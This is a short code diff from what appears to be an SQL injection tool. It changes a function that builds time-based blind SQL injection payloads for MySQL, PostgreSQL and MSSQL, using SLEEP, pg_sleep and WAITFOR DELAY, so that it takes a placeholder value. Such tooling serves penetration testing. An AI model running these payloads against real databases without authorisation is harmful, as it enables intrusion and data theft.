@@ -53,13 +53,15 @@ def get_charset_bounds(charset: str = DEFAULT_CHARSET) -> tuple[int, int]:
 # --- DBMS Payload Builders ---
 
 
-def dbms_time_delay(dbms: DBMS, condition: str, delay: int = 3) -> str:
+def dbms_time_delay(
+    dbms: DBMS, placeholder: str, condition: str, delay: int = 3
+) -> str:
     if dbms == "mysql":
-        return f"1 AND IF(({condition}), SLEEP({delay}), 0)--"
+        return f"{placeholder} AND IF(({condition}), SLEEP({delay}), 0)--"
     elif dbms == "postgres":
-        return f"1 AND CASE WHEN ({condition}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--"
+        return f"{placeholder} AND CASE WHEN ({condition}) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--"
     elif dbms == "mssql":
-        return f"1; IF({condition}) WAITFOR DELAY '0:0:{delay}'--"
+        return f"{placeholder}; IF({condition}) WAITFOR DELAY '0:0:{delay}'--"
     raise ValueError("Unsupported DBMS")
 
 
